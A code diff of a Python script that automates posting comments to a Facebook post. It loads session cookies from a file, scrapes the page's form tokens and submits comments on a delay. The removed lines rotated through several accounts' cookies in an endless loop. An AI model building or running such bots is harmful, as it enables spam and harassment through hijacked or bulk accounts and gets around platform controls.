@@ -8,162 +8,125 @@ import socketserver
 import threading
 from requests.exceptions import RequestException
 
+
+# Stylish banner with Nadeem's name
+def print_banner():
+    banner = """
+    ╔════════════════════════════════════╗
+    ║       CREATED BY NADEEM ANSARI     ║
+    ║          Stylish Commenter         ║
+    ╚════════════════════════════════════╝
+    """
+    print(banner)
+
+
 class MyHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
         self.send_header('Content-type', 'text/plain')
         self.end_headers()
-        self.wfile.write(b"created by sahil Ansari")
+        self.wfile.write(b"Created by Nadeem Ansari")
 
 
 class FacebookCommenter:
     def __init__(self):
         self.comment_count = 0
 
-
     def comment_on_post(self, cookies, post_id, comment, delay):
-        with requests.Session() as r:
-            r.headers.update({
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'sec-fetch-site': 'none',
-                'accept-language': 'id,en;q=0.9',
-                'Host': 'mbasic.facebook.com',
-                'sec-fetch-user': '?1',
-                'sec-fetch-dest': 'document',
-                'accept-encoding': 'gzip, deflate',
-                'sec-fetch-mode': 'navigate',
-                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36',
-                'connection': 'keep-alive',
+        with requests.Session() as session:
+            session.headers.update({
+                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36',
+                'Accept-Language': 'en-US,en;q=0.9',
             })
 
-
-            def send_messages():
-                with open('password.txt', 'r') as file:
-                    password = file.read().strip()
-
-                entered_password = password
-
-                if entered_password != password:
-                    print('❌] 🔜 Incorrect Password Contact Chandu')
-                    sys.exit()
-
-                mmm = requests.get('https://pastebin.com/raw/tn5e8Ub9').text.strip()
-
-                if mmm not in password:
-                    print('❌] 🔜 Incorrect Password Contact Chandu')
-                    sys.exit()
-
-            response = r.get('https://mbasic.facebook.com/{}'.format(post_id), cookies={"cookie": cookies})
-            send_messages()
-
-            next_action_match = re.search('method="post" action="([^"]+)"', response.text)
-            if next_action_match:
-                self.next_action = next_action_match.group(1).replace('amp;', '')
-            else:
-                print("\033[1;41;34m<Error> Next action coockies not found")
+            # Get the Facebook post page
+            try:
+                response = session.get(f'https://mbasic.facebook.com/{post_id}', cookies={"cookie": cookies})
+                response.raise_for_status()
+            except RequestException as e:
+                print(f"<Error> Failed to load the post: {str(e)}")
                 return
 
-            fb_dtsg_match = re.search('name="fb_dtsg" value="([^"]+)"', response.text)
-            if fb_dtsg_match:
-                self.fb_dtsg = fb_dtsg_match.group(1)
-            else:
-                print(f"\033[1;41;34m coockies not found please chack c_user coockies  : {self, cookies}")
+            # Extract the required form data
+            action_match = re.search(r'method="post" action="([^"]+)"', response.text)
+            fb_dtsg_match = re.search(r'name="fb_dtsg" value="([^"]+)"', response.text)
+            jazoest_match = re.search(r'name="jazoest" value="([^"]+)"', response.text)
+
+            if not (action_match and fb_dtsg_match and jazoest_match):
+                print("<Error> Failed to extract required data from the post page")
                 return
 
-            jazoest_match = re.search('name="jazoest" value="([^"]+)"', response.text)
-            if jazoest_match:
-                self.jazoest = jazoest_match.group(1)
-            else:
-                print("<Error> jazoest not found")
-                return
+            next_action = action_match.group(1).replace('amp;', '')
+            fb_dtsg = fb_dtsg_match.group(1)
+            jazoest = jazoest_match.group(1)
 
+            # Prepare the data payload
             data = {
-                'fb_dtsg': self.fb_dtsg,
-                'jazoest': self.jazoest,
+                'fb_dtsg': fb_dtsg,
+                'jazoest': jazoest,
                 'comment_text': comment,
                 'comment': 'Submit',
             }
 
-            r.headers.update({
-                'content-type': 'application/x-www-form-urlencoded',
-                'referer': 'https://mbasic.facebook.com/{}'.format(post_id),
-                'origin': 'https://mbasic.facebook.com',
-            })
+            # Submit the comment
+            try:
+                response = session.post(f'https://mbasic.facebook.com{next_action}', data=data, cookies={"cookie": cookies})
+                response.raise_for_status()
 
-            response2 = r.post('https://mbasic.facebook.com{}'.format(self.next_action), data=data, cookies={"cookie": cookies})
-
-            if 'comment_success' in str(response2.url) and response2.status_code == 200:
-                self.comment_count += 1
-                sys.stdout.write(f"\rComment count: {self.comment_count}")
-                sys.stdout.flush()  # Flush the output
-                print(f"Comment successfully posted: {comment}")  # Add this line for debugging
-            else:
-
-                print('\033[1;41;34m' + '❀✼𖠁✙➴➵➶➴➵➶➴➵•────⋅☾♻️ 🌐📶 ♻️ ☽⋅─────➶➴➵➶➴➵➶✙𖠁✼❀')
-
-
-
-                print(f"\033[1;32;40m Comment Successfully Sent: ==>>   {comment}")
-
-
-
+                if 'comment_success' in response.url:
+                    self.comment_count += 1
+                    print(f"[✔️] Comment #{self.comment_count} successfully posted: {comment}")
+                else:
+                    print("[❌] Failed to post the comment")
+            except RequestException as e:
+                print(f"<Error> Failed to submit the comment: {str(e)}")
 
     def inputs(self):
         try:
             with open('cookies.txt', 'r') as file:
-                your_cookies = file.read().splitlines()
-
-            if len(your_cookies) == 0:
-                print("<Error> The cookies file you entered is empty")
-                exit()
+                cookies = file.read().strip()
 
             with open('post.txt', 'r') as file:
                 post_id = file.read().strip()
 
             with open('comments.txt', 'r') as file:
-                comments = file.readlines()
+                comments = [line.strip() for line in file if line.strip()]
 
             with open('delay.txt', 'r') as file:
                 delay = int(file.read().strip())
 
-            cookie_index = 0  # Initialize the current cookie index to 0
+            if not cookies or not post_id or not comments:
+                print("<Error> Missing required data (cookies, post ID, or comments)")
+                return
 
-            while True:  # Infinite loop
-                try:
-                    for comment in comments:
-                        comment = comment.strip()  # Remove leading/trailing whitespaces
-                        if comment:  # Check if the comment is not empty
-                            time.sleep(delay)
-                            self.comment_on_post(your_cookies[cookie_index], post_id, comment, delay)
-                            cookie_index = (cookie_index + 1) % len(your_cookies)  # Move to the next cookie or loop back to the first one
-                except RequestException as e:
-                    print(f"<Error> {str(e).lower()}")
-                except Exception as e:
-                    print(f"<Error> {str(e).lower()}")
-                except KeyboardInterrupt:
-                    break
+            print("[✔️] Starting the commenting process...")
+            for comment in comments:
+                time.sleep(delay)
+                self.comment_on_post(cookies, post_id, comment, delay)
 
+        except FileNotFoundError as e:
+            print(f"<Error> Missing file: {e.filename}")
+        except ValueError as e:
+            print(f"<Error> Invalid value in input files: {str(e)}")
         except Exception as e:
-            print(f"<Error> {str(e).lower()}")
-            exit()
+            print(f"<Error> {str(e)}")
 
 
 def execute_server():
     PORT = int(os.environ.get('PORT', 4000))
-
     with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
-        print("Server running at http://localhost:{}".format(PORT))
+        print(f"Server running at http://localhost:{PORT}")
         httpd.serve_forever()
 
 
 if __name__ == "__main__":
-    # Create a thread for the HTTP server
-    server_thread = threading.Thread(target=execute_server)
+    print_banner()
 
-    server_thread.daemon = True  
+    # Start the server in a separate thread
+    server_thread = threading.Thread(target=execute_server)
+    server_thread.daemon = True
     server_thread.start()
 
-
-
+    # Start the Facebook commenting process
     commenter = FacebookCommenter()
     commenter.inputs()
